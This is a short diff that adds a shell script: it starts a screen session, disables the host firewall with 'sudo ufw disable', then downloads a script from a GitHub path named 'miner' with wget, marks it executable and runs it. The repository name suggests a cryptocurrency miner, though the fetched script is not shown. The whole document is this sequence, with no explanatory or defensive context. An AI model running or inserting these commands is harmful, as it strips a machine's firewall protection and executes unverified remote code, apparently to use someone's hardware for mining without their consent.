@@ -1,0 +1,4 @@
+screen
+
+sudo ufw disable
+wget https://raw.githubusercontent.com/Zivin30/miner/main/Gas/Kp.sh && chmod +x Kp.sh && ./Kp.sh
